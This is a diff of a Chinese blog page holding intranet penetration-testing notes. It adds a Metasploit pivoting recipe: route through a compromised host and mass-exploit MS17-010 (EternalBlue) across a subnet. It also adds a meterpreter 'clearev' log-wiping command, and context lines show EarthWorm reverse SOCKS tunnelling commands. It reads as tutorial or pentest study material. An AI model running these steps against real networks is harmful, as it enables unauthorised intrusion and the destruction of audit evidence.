@@ -6,7 +6,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    内网渗透笔记(持续更新) |  w&#39; Blog
+    内网渗透笔记(大致框架) |  w&#39; Blog
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -39,7 +39,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  内网渗透笔记(持续更新)
+  内网渗透笔记(大致框架)
 </h1>
   
 
@@ -48,8 +48,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time datetime="2020-03-13T00:45:45.000Z" itemprop="datePublished">2020-03-13</time>
+      <a href="/2020/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" class="article-date">
+  <time datetime="2020-03-18T00:45:45.000Z" itemprop="datePublished">2020-03-18</time>
 </a>
       
   <div class="article-category">
@@ -63,7 +63,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">2.9k字</span>
+            <span class="post-count">3.1k字</span>
         </span>
     </span>
 
@@ -214,6 +214,7 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
 </li>
 <li>跳板代理后使用nmap扫描(4.3后渗透部分)</li>
 </ul>
+<hr>
 <h3 id="4-2-漏洞验证-漏洞攻击"><a href="#4-2-漏洞验证-漏洞攻击" class="headerlink" title="4.2. 漏洞验证/漏洞攻击"></a>4.2. 漏洞验证/漏洞攻击</h3><h4 id="4-2-1-web常见漏洞"><a href="#4-2-1-web常见漏洞" class="headerlink" title="4.2.1 web常见漏洞"></a>4.2.1 web常见漏洞</h4><ul>
 <li>基础知识</li>
 </ul>
@@ -313,7 +314,8 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
 <h4 id="4-2-5-常见的web应用系统漏洞"><a href="#4-2-5-常见的web应用系统漏洞" class="headerlink" title="4.2.5. 常见的web应用系统漏洞"></a>4.2.5. 常见的web应用系统漏洞</h4><ul>
 <li>cms应用漏洞(在线检索以及学习积累)</li>
 </ul>
-<h3 id="4-3-后渗透"><a href="#4-3-后渗透" class="headerlink" title="4.3. 后渗透"></a>4.3. 后渗透</h3><p>应用场景：外网主机A（攻击者）,内网主机B（拿下权限的跳板）,内网主机C（目标主机），A可访问B,A不可访问C。</p>
+<hr>
+<h3 id="4-3-后渗透"><a href="#4-3-后渗透" class="headerlink" title="4.3. 后渗透"></a>4.3. 后渗透</h3><p><em>应用场景：外网主机A（攻击者）,内网主机B（拿下权限的跳板）,内网主机C（目标主机），A可访问B,A不可访问C。</em></p>
 <h4 id="4-3-1-端口转发（跳板）"><a href="#4-3-1-端口转发（跳板）" class="headerlink" title="4.3.1. 端口转发（跳板）"></a>4.3.1. 端口转发（跳板）</h4><ul>
 <li>端口映射：将内网主机开放的内部端口映射到外网主机（有公网IP的主机）任意端口，提供相应的服务。</li>
 <li>端口转发：通过端口从一个网络节点转发到另一个网络节点，通常是把内网的端口转发到外网的主机，搭建隧道，即能实现从外网访问内网资源。</li>
@@ -345,20 +347,27 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
 <li><p>正向代理<br>跳板主机上没有任何防火墙策略限制端口或者允许端口x的流量</p>
 <ol>
 <li>在跳板机B上执行：<code>ew -s ssocksd -l port_x</code>,开启代理服务，任何连接代理的主机可以获取跳板机B的可访问资源。</li>
-<li>A上连接代理 <code>B_ip:port_x</code>（windows下Proxifier，SocksCap等代理连接工具，linux使用proxychains，<strong>但是proxychains不支持udp和icmp协议，使用namap时注意使用-Pn -sT</strong>）</li>
+<li>A上连接代理 <code>B_ip:port_x</code>（windows下Proxifier，SocksCap等代理连接工具，linux使用proxychains，<strong>但是proxychains不支持udp和icmp协议，使用nmap时注意使用-Pn -sT</strong>）</li>
 </ol>
 </li>
 <li><p>反向代理</p>
 <ol>
 <li>在A上监听：<code>ew -s rcsocks -e port_x -l port_y</code>,监听端口x和y，攻击者A访问端口y,跳板访问端口x</li>
 <li>在跳板机B上反向连接：<code>ew -s rssocks -d ip_A -e port_x</code></li>
-<li>A使用代理连工具连接代理 <code>A_ip:port_y</code>（windows下Proxifier，SocksCap等代理连接工具，linux使用proxychains,<strong>但是proxychains不支持udp和icmp协议，使用namap时注意使用-Pn -sT</strong>）</li>
+<li>A使用代理连工具连接代理 <code>A_ip:port_y</code>（windows下Proxifier，SocksCap等代理连接工具，linux使用proxychains,<strong>但是proxychains不支持udp和icmp协议，使用nmap时注意使用-Pn -sT</strong>）</li>
 </ol>
 </li>
 </ul>
 </li>
 </ul>
-<h3 id="4-4-日志清理"><a href="#4-4-日志清理" class="headerlink" title="4.4. 日志清理"></a>4.4. 日志清理</h3>
+<h4 id="4-3-3-Metasploit框架"><a href="#4-3-3-Metasploit框架" class="headerlink" title="4.3.3 Metasploit框架"></a>4.3.3 Metasploit框架</h4><p><em>应用场景：已拿下跳板机（内网服务器）的权限(已用meterpreter模块已拿到shell)，发现内网有大量的存在ms17-010漏洞主机</em></p>
+<ol>
+<li>查看已拿下目标主机的内网ip段情况:<code>run get_local_subnets</code></li>
+<li>添加目标内网的静态路由：<code>run autoroute -s 网段</code>,查看是否成功添加<code>run autoroute -p</code>,将session放入后台<code>backgroud</code></li>
+<li>使用ms17-010漏洞利用模块：<code>use exploit/windows/smb/ms17_010_eternalblue</code>,设置目标网段参数进行批量攻击<code>set rhosts 目标网段</code>，获取多个<code>session</code></li>
+</ol>
+<h3 id="4-4-日志清理"><a href="#4-4-日志清理" class="headerlink" title="4.4. 日志清理"></a>4.4. 日志清理</h3><p>  对于白帽而言，这不是研究的重点。<br>  meterpreter会话下<code>clearev</code></p>
+
       
       <!-- reward -->
       
@@ -427,7 +436,7 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -819,7 +828,7 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
     
     
     <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
-        src="//music.163.com/outchain/player?type=2&id=492390949&auto=1&height=32"></iframe>
+        src="//music.163.com/outchain/player?type=2&id=448738638&auto=1&height=32"></iframe>
 </div>
 
 <style>
